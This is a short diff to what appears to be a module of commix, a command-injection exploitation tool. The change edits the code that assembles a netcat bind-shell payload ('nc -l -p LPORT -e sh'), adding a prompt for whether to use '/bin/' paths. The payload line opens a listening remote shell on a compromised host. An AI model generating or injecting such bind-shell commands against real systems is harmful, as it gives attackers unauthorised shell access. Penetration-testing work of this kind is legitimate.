@@ -164,11 +164,14 @@ Set up the netcat bind TCP connection
 """
 def netcat_version():
 
+  # Defined shell
+  shell = "sh"
+  
   # Netcat alternatives
   NETCAT_ALTERNATIVES = [
-    "/bin/nc",
-    "/bin/busybox nc",
-    "/bin/nc.traditional"
+    "nc",
+    "busybox nc",
+    "nc.traditional"
   ]
 
   while True:
@@ -202,7 +205,30 @@ commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_netcat""" + Style.RESET_ALL +
       print settings.print_error_msg(err_msg)
       continue
 
-  cmd = nc_alternative + " -l -p " + settings.LPORT + " -e /bin/sh"
+  while True:
+    if not menu.options.batch:
+      question_msg = "Do you want to use '/bin' standard subdirectory? [y/N] > "
+      sys.stdout.write(settings.print_question_msg(question_msg))
+      enable_bin_dir = sys.stdin.readline().replace("\n","").lower()
+    else:
+      enable_bin_dir = ""
+    if len(enable_bin_dir) == 0:
+       enable_bin_dir = "n"              
+    if enable_bin_dir in settings.CHOICE_NO:
+      break  
+    elif enable_bin_dir in settings.CHOICE_YES :
+      nc_alternative = "/bin/" + nc_alternative
+      shell = "/bin/" + shell
+      break    
+    elif enable_bin_dir in settings.CHOICE_QUIT:
+      sys.exit(0)
+    else:
+      err_msg = "'" + enable_bin_dir + "' is not a valid answer."  
+      print settings.print_error_msg(err_msg)
+      pass
+
+
+  cmd = nc_alternative + " -l -p " + settings.LPORT + " -e " + shell
 
   return cmd
 
